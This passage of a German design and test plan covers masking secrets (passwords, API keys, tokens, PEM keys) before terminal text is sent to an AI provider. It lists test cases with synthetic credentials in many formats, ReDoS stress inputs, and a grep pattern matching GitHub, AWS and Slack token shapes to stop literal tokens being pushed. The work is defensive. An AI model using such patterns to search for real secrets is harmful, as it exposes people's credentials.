3. **Lange Einzelzeilen.** Eine Zeile über 6 000 bzw. 8 000 Zeichen wird weiter mitten im Text gekürzt. Ein Token genau an der Schnittkante kann als Bruchstück hinausgehen (Handbuch).
4. **Secret Scanning beim Push.** Synthetische Tokens im Repo könnten den Push-Schutz von GitHub auslösen. Deshalb sind sie aus Teilen zusammengesetzt (R13). Der Prüfer kontrolliert per `grep -E 'ghp_[A-Za-z0-9]{36}|AKIA[A-Z0-9]{16}|xoxb-'` über die Diff, dass kein Literal am Stück steht.
5. **Speicher.** Main hält gefundene Werte je Unterhaltung (höchstens 32 Unterhaltungen). Das ist dieselbe Klasse wie die Zugangsdaten offener Sitzungen. Verworfen werden sie beim Trennen, beim Vault-Wechsel und beim Schließen des Fensters, nicht beim Sperren (R3).
6. **Platzhalter im eigenen Text.** Schreibt der Nutzer selbst `[SECRET_1]`, bleibt das stehen und kann das Modell verwirren. Harmlos.
7. **Downgrade auf 0.24.0:** Sie verwirft `maskSecrets` beim Speichern, maskiert aber ohnehin nicht. Nach dem erneuten Upgrade ist die Maskierung wieder an. Das ist die sichere Richtung.
8. **Gate in Welle 1:** `AiAskRequest` bekommt ein Pflichtfeld, deshalb ist der Typecheck bis zum Ende von Welle 2 rot (Abschnitt 4). Das ist bewusst so, damit kein optionales Feld ohne Prüfung bleibt.
9. **Leistung bei vielen bekannten Werten.** Der Durchgang über bekannte Werte wächst mit der Zahl der Funde einer Unterhaltung. Er ist durch den Text begrenzt (höchstens 256 KiB je Anfrage, 12 Nachrichten Verlauf), der Prototyp braucht 27 ms für 1 000 Werte.
10. **`kind: Secret`-Regel:** Sie maskiert auch ConfigMap-Daten im selben Text. Gewollt.

## 10. Testideen (Pflicht = **fett**)

### 10.1 Masker (`secret-mask.test.ts`, Task B)
Alle Tokens werden im Test aus Teilen gebaut (R13).
- **Fixture-Abdeckung:** `DEMO_ENV` aus 6.0 im Test nachgebaut, nicht importiert (eine `.mjs`-Datei aus `.claude` hat keine Typen; die Bindung an die echte Fixture prüft 10.4): Nach `mask(env, ['sk-synthetic-demo', 'synthetic-demo'])` steht keiner der `DEMO_SECRETS`-Werte mehr im Text, alle `DEMO_KEPT` stehen noch, `numbers.size === 14`.
- **Je Regel ein Fall:** `DB_PASSWORD=x9Kq2…` → `DB_PASSWORD=[SECRET_1]`; `"password": "p\"w"` → `"password": "[SECRET_1]"`; `export PGPASSWORD='s3cret value'` maskiert den ganzen Wert in Anführungszeichen; `Server=db;User Id=sa;Password=Pa55w0rd!;` → nur das Passwort; `--from-literal=password=abc123`; `mysql --password hunter22 -h db`; `$env:API_KEY = "abc12345"`; `x-api-key: abcdef123`; `Authorization: Basic dXNlcjpwYXNz`; `Bearer` + 20 Zeichen; `postgres://app:pw@db/x` → nur `pw`; AWS-, GitHub-, Slack-, `sk-`, `AIza`-, JWT- und Webhook-Formen; `sig=` in einer SAS-URL.
- **PEM:** vollständiger Block → nur der Rumpf, BEGIN- und END-Zeile bleiben; BEGIN ohne END → bis zum Textende; END ohne BEGIN → die base64-Zeilen darüber; `-----BEGIN PGP PRIVATE KEY BLOCK-----` wird erkannt.
- **Secret-YAML:** `kind: Secret` mit `data:` → beide Werte maskiert, `metadata.name` bleibt; derselbe Text **ohne** `kind: Secret` → `data:`-Werte bleiben (sie sind nicht als Secret erkennbar).
- **Keine Falsch-Positiven:** `max_tokens: 4000`, `token_count: 12`, `secretName: my-secret`, `password_min_length: 8`, `[sudo] password for demo:`, `Password: `, `bypass: true`, `password=${DB_PASS}`, `password: <dein Passwort>`, `password: ***`, eine 40-stellige Commit-ID, `sha256:` plus 64 Hex, eine UUID, `ssh-ed25519 AAAAC3…`, `https://user@host/x` und `git log 3f2a9c1` bleiben **unverändert**.
- **Stabilität:** Derselbe Wert in zwei `mask`-Aufrufen ergibt denselben Platzhalter. Zwei Werte ergeben `[SECRET_1]` und `[SECRET_2]` in der Reihenfolge des ersten Auftretens.
- **Bekannte Werte:** Nach `mask('DB_PASSWORD=Synth-Pass-4711', [])` maskiert `mask('mysql -pSynth-Pass-4711', [])` den Wert als `[SECRET_1]`. Ein Fund mit 5 Zeichen wird nicht als bekannter Wert gesucht.
- **Literale:** längster zuerst (`sk-synthetic-demo` vor `synthetic-demo` ergibt zwei verschiedene Platzhalter, kein Rest `sk-`); `numbers` enthält die verwendeten Nummern.
- **`vaultLiterals`:** Sammelt Passwort und Passphrase aus SSH und SFTP, das RDP-Passwort und `apiKey` aus Ordnern in jeder Tiefe; lässt Werte unter 6 Zeichen und reine Leerzeichen weg; ergänzt die URL-kodierte Form (`p@ss word!` → zusätzlich `p%40ss%20word!`); sortiert absteigend nach Länge; liefert ohne `ai` und ohne Passwörter `[]`.
- **Laufzeit (ReDoS):** Jede dieser Einheiten, wiederholt auf 262 144 Zeichen, braucht weniger als 1 000 ms: `a`, `eyJ`, `eyJa.`, `-----BEGIN `, `-----END A PRIVATE KEY-----\n`, `password=`, `password: "`, `password=x `, `a://`, `a://b:c`, `x:`, `"`, `sk-`, `--password `, `--token=`, `\n`, `AAAAAAAAAAAAAAAAAAAAAAAA\n`, `Bearer `, `Authorization: Basic `, `LS0tLS1CRUdJTi`, `a.`, `a-`, `kind: Secret\ndata:\n  a: b\n`, `[SECRET_1]`, `AKIA`, `ghp_`. Dazu 1 000 Literale auf 256 KiB unter 1 000 ms.

### 10.2 Service (`assistant.test.ts`, `providers.test.ts`, Task C)
- **Alle Nachrichten maskiert:** Ein `stream`-Spion sieht in **jeder** Nachricht (Nutzer und Assistent, auch im Verlauf) und im `system` kein Literal aus `secrets()`, dafür `[SECRET_1]`.
- **Ereignis:** `masked` kommt vor dem ersten `delta` mit `count` = Zahl der Platzhalter in der letzten Nutzer-Nachricht. Ohne Fund in der letzten Nachricht gibt es kein `masked`, auch wenn der Verlauf Funde hat.
- **Stabil je Unterhaltung:** Zwei `ask` mit derselben `conversationId` ergeben für denselben Wert dieselbe Nummer. Eine andere `conversationId` beginnt bei 1. Nach `cancelOwner(1)` beginnt dieselbe `conversationId` von Fenster 1 wieder bei 1. Nach `cancelAll()` ebenso.
- **Schalter:** Ein Anbieter mit `maskSecrets: false` bekommt den Text unverändert, ohne `masked`-Ereignis, und der Prompt hat 9 Zeilen. Mit Maskierung hat er 10, und die letzte ist `assistant.prompt.masked`.
- **Scheitern:** `vi.spyOn(SecretMasker.prototype, 'mask').mockImplementation(() => { throw new Error('x'); })` → `ask` wirft `ai.maskFailed`, und `stream` wird **nicht** gerufen.
- **Katalog:** `aiCatalog` liefert `masking: true` ohne Feld, `masking: false` bei `maskSecrets: false` und nie den `apiKey` (bestehender Test `providers.test.ts:92`).
- `test()` bleibt unmaskiert und unverändert (bestehender Test).

### 10.3 Renderer (`terminal-access.test.ts`, `assistant-chat.test.ts`, Task R)
- **`rangeText`:** Zwei Zeilen `['abc', false], ['def', true]` → `abcdef`; ein Bereich, der bei der umbrochenen Zeile beginnt (`from = 1`), liefert trotzdem `abcdef`; die letzte Zeile wird rechts getrimmt, eine fortgesetzte nicht; leere Endzeilen fallen weg.
- **`tail`:** `tail('abcdef', 3)` bleibt `…\ndef` (bestehend). `tail('l1\nl2\nl3', 4)` → `…\nl3` (das angeschnittene `2` fällt weg).
- **`compactMessage`:** Ein Text mit Zeilen, dessen 600. Zeichen mitten in einer Zeile liegt, endet vor dieser Zeile plus `…(gekürzt)`. `'x'.repeat(5000)` bleibt wie bisher (bestehende Tests).

### 10.4 Fake (`fakes.test.mjs`, Task I1)
- **Protokoll:** `startAiFake({ port: 0, runDir: base })`, eine Anfrage über `streamChat` → `base/ai-requests.jsonl` hat genau eine Zeile, sie enthält den Nachrichtentext und **nicht** `sk-synthetic-demo` (der Schlüssel steht nur im Header).
- **Platzhalter-Antwort:** Eine Nachricht mit `[SECRET_3]` ergibt eine Antwort mit `PGPASSWORD='[SECRET_3]'`.
- **Fixture gegen Masker:** `new SecretMasker().mask(DEMO_ENV, [DEMO_SECRETS.vaultApiKey, DEMO_SECRETS.vaultPassword])` lässt keinen Wert aus `DEMO_SECRETS` übrig und behält alle `DEMO_KEPT`. Das bindet Fixture und Masker aneinander, damit die Szene nicht an einer Fixture-Änderung bricht.

### 10.5 Ohne Komponententest (keine DOM-Testumgebung)
Panel-Hinweise, der Schalter im Formular und das `masked`-Ereignis im UI werden über run-app 6.2 abgesichert, mit dem Protokoll des Fakes als Beleg.
